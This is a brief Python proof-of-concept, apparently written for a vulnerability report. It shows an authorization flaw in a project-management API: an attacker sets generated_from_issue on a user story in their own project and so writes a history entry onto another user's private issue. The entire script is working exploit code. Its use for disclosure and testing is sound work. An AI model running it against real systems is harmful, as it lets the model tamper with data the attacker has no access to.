"""generated_from_issue / generated_from_task are not read-only and not project-validated.
Creating a US in your own project linked to another project's issue injects a history
entry onto that foreign issue and saves it, despite no view access to it."""
from lib import *
victim = register('vic'); attacker = register('att')
V = mkproject(victim, private=True); A = mkproject(attacker, private=True)
issue = victim.post("/issues", {"project": V["id"], "subject": "secret issue"}).json()
print("attacker GET victim issue ->", attacker.get(f"/issues/{issue['id']}").status_code)
print("history before:", len(victim.get(f"/history/issue/{issue['id']}").json()))
r = attacker.post("/userstories", {"project": A["id"], "subject": "pwn", "generated_from_issue": issue["id"]})
print("create US w/ foreign generated_from_issue ->", r.status_code, "us.generated_from_issue=", r.json().get("generated_from_issue"))
h = victim.get(f"/history/issue/{issue['id']}").json()
print("history after:", len(h), "->", [e.get("comment") for e in h])
